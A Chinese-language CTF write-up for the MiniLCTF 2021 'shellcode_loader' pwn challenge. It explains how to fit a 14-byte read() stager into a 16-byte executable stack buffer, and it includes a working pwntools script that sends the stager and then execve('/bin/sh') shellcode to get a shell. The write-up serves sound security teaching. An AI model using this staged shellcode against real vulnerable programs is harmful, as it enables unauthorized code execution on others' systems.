# MiniLCTF 2021 - shellcode_loader

## 题目简述

程序是 64 位 PIE，Full RELRO、无栈 Canary，并且栈可执行。它用 `%s` 把输入读到堆上，再通过 `strncpy` 只复制 16 字节到栈缓冲区，最后把这 16 字节当函数调用。调用前 `rdi`、`rsi`、`rdx` 都被设为 `0xdeadbeef`，因此不仅要在极短空间内扩展载荷，还不能假定参数寄存器或通用寄存器为零。

## 解题过程

第一阶段不直接构造 `execve`，而是调用 `read` 把完整第二阶段读到相邻栈空间。进入短 shellcode 时，`rbp` 仍指向当前函数栈帧；选择 `rbp+0x10` 可避开 16 字节载荷自身。把 `rax`、`rdi` 清零后执行 `read(0, rbp+0x10, rdx)`，其中原有的巨大 `rdx` 只表示允许读取的上限，实际读取长度由我们发送的数据决定。

14 字节 stager 为：

```asm
xor rax, rax
mov rdi, rax
lea rsi, [rbp + 0x10]
syscall
jmp rsi
```

这些机器码不含 `%s` 会截断的 NUL 或空白字符。随后发送常规 `execve("/bin/sh", 0, 0)` shellcode：

```python
from pwn import asm, context, remote, shellcraft

context.arch = "amd64"
p = remote("127.0.0.1", 9999)

stage1 = asm("""
    xor rax, rax
    mov rdi, rax
    lea rsi, [rbp + 0x10]
    syscall
    jmp rsi
""")
assert len(stage1) <= 15
assert not any(x in stage1 for x in b"\x00\x09\x0a\x0b\x0c\x0d\x20")

p.sendline(stage1)
p.send(asm(shellcraft.sh()))
p.interactive()
```

早期参赛脚本直接沿用 `rbx == 0` 的本地状态，在 Ubuntu 20.04 远程环境中并不稳定。上面的第一阶段显式初始化系统调用必需的寄存器，不依赖这种偶然状态。flag 位于远程容器，仓库没有保存固定值。

## 方法总结

极短 shellcode 的通用思路是先获得第二次、长度更大的输入，而不是把最终功能硬塞进第一阶段。复现时要同时检查长度、坏字符、目标地址和寄存器初值；“本地寄存器碰巧为零”不是可移植条件。NX 已关闭只说明代码可执行，真正的难点仍是 16 字节复制上限与不可信寄存器状态。
